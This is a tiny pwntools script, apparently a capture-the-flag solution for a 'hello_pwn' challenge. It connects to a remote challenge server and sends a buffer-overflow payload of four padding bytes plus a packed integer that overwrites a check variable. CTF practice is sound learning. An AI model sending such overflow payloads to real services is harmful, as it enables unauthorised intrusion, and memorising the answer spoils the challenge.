from pwn import *

#context.log_level = 'debug'

#r = process("./hello_pwn")
r = remote('111.198.29.45', 42136)

payload = 'A' * 4 + p64(1853186401)

r.recvuntil("lets get helloworld for bof\n")
r.sendline(payload)
print r.recv()
